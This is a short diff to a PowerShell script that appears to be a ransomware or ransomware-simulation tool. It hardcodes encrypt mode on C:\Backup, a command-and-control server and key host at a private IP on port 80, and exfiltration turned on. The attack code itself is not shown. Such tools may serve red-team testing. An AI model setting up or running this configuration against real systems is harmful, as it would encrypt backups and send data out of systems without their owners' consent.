@@ -52,6 +52,14 @@ $C2Port = $args[5]
 $Exfil = $args[6]
 $C2Status = $null
 
+$Mode = '-e'
+$Directory = 'C:\Backup'
+$PSRKey = '172.16.243.101'
+$C2Server = '172.16.243.101'
+$C2Port = '80'
+$Exfil = '-x'
+$C2Status = $null
+
 # Errors
 if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
 #if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!-1" -ForegroundColor Green ; Write-Host ; break }
